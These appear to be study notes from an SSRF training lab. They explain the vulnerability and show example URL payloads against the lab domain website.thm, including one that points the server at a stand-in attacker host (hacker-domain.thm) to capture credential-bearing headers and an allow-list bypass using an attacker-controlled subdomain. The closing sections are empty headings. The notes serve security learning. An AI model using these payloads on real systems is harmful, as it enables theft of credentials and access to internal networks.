# SSRF
### Task 1 What is an SSRF?
Server-Side Request Forgery. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.

##### Types of SSRF
There are two types of SSRF vulnerability; the first is a regular SSRF where data is returned to the attacker's screen. The second is a Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen.

##### Impact
- Access to unauthorized areas
- Access to customer/organizational data
- Ability to Scale to internal networks
- Reveal authentication tokens/credentials

### Task 2 SSRF Examples
##### Expected Request
http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123

![[Pasted image 20220204172253.png]]

If the attacker only has control over the path, can use directory traversal still.

http://website.thm/stock?url=/item?id=123

The attack can also control the server's subdomain to which the request is made. Take note of the payload ending in `&x=` being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter.

http://website.thm/stock?server=api&id=123

Going back to the original request, the attacker can instead force the webserver to request a server of the attacker's choice. By doing so we can capture request headers that are sent to the attacker's specified domain. These headers could contain authentication credentials or API keys sent by website.thm (that would normally authenticate to api.website.thm)

http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123

hacker requests: http://website.thm/stock?url=http://hacker-domain.thm/

### Task 3 Finding an SSRF
Potential SSRF vulnerabilities can be spotted in web applications in many different ways. Common places to look:
- When a full URL is used in a parameter in the address bar
- A hidden field in a form
- A partial URL such as just the hostname
- Or perhaps only the path of the URL

Some of these are easier to exploit than others, and this is where a lot of trial and error comes in required to finding a working payload

If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client

### Task 4 Defeating Common SSRF Defenses
More security-savvy developers are aware of the risks of SSRF vulnerabilities may implement checks in their applications to make sure the requested resource meets specific rules. There are usually two approaches to this, either a deny list or an allow list.

##### Deny List
A deny list is where all requests are accepted apart from resources specified in a list or matching a particular pattern.

##### Allow List
An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL need in a parameter must begin with **`https://website.thm`**. An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application would allow this input and let an attacker take control of the internal HTTP request.

##### Open Redirect

### Task 5 Practical SSRF

